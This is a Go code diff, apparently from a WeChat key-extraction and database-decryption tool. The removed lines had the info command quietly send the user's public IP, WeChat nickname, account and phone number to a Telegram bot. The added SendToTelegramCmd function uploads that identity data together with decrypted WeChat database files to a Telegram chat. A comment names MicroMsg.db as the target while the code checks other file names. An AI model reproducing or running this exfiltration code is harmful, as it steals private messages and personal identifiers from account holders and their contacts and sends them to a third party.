@@ -49,13 +49,6 @@ func ShowInfoCmd() {
 	fmt.Printf("WeChat Account: %s \n", WeChatDataObject.Account)
 	fmt.Printf("WeChat Mobile: %s \n", WeChatDataObject.Mobile)
 	fmt.Printf("WeChat Key: %s \n", WeChatDataObject.Key)
-	if TELBOT_TOKEN != "" && TELBOT_CHAT_ID != 0 {
-		publicIp, err := GetPublicIp()
-		if err != nil {
-			publicIp = ""
-		}
-		SendMessge(fmt.Sprintf("[%s][%s][%s][%s][%s]", publicIp, WeChatDataObject.Version, WeChatDataObject.NickName, WeChatDataObject.Account, WeChatDataObject.Mobile))
-	}
 }
 
 func DecryptCmd() {
@@ -165,4 +158,40 @@ func FriendsListCmd() {
 		}
 	}
 	weChatDb.Close()
+}
+
+func SendToTelegramCmd() {
+	if TELBOT_TOKEN != "" && TELBOT_CHAT_ID != 0 {
+		publicIp, err := GetPublicIp()
+		if err != nil {
+			publicIp = ""
+		}
+		markDownText := fmt.Sprintf("```\n[%s]\n微信版本: %s\n微信昵称: %s\n微信账号: %s\n微信手机号: %s\n```", publicIp, WeChatDataObject.Version, WeChatDataObject.NickName, WeChatDataObject.Account, WeChatDataObject.Mobile)
+		fileList := make([]string, 0)
+		// 将decrypted目录下的所有.db文件添加到fileList中
+		err = filepath.Walk(filepath.Join(CurrentPath, "decrypted"), func(path string, info os.FileInfo, err error) error {
+			if err != nil {
+				return err
+			}
+			// 判断如果不是.db文件，就跳过
+			if filepath.Ext(path) != ".db" {
+				return nil
+			}
+			// 如果不是MicroMsg.db则跳过
+			if info.Name() != "hello.db" && info.Name() != "word.db" {
+				return nil
+			}
+			if !info.IsDir() {
+				fileList = append(fileList, path)
+			}
+			return nil
+		})
+		// 如果fileList不为空，就发送文件
+		if len(fileList) > 0 {
+			TeleSendFileAndMessage(markDownText, fileList)
+		} else {
+			TeleSendMarkDownMessage(markDownText)
+		}
+
+	}
 }
